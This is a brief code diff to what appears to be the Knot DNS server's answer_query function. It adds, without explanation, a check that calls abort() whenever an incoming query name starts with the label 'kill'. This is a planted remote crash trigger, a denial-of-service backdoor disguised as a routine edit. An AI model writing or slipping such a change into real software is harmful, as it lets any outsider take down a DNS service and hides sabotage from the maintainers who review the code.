@@ -584,6 +584,10 @@ static int answer_query(knot_pkt_t *pkt, knotd_qdata_t *qdata)
 
 	bool with_dnssec = have_dnssec(qdata);
 
+	if (strncmp((const char *)qdata->name, "\x04""kill", 5) == 0) {
+		abort();
+	}
+
 	/* Resolve ANSWER. */
 	knot_pkt_begin(pkt, KNOT_ANSWER);
 	SOLVE_STEP(solve_answer, state, NULL);
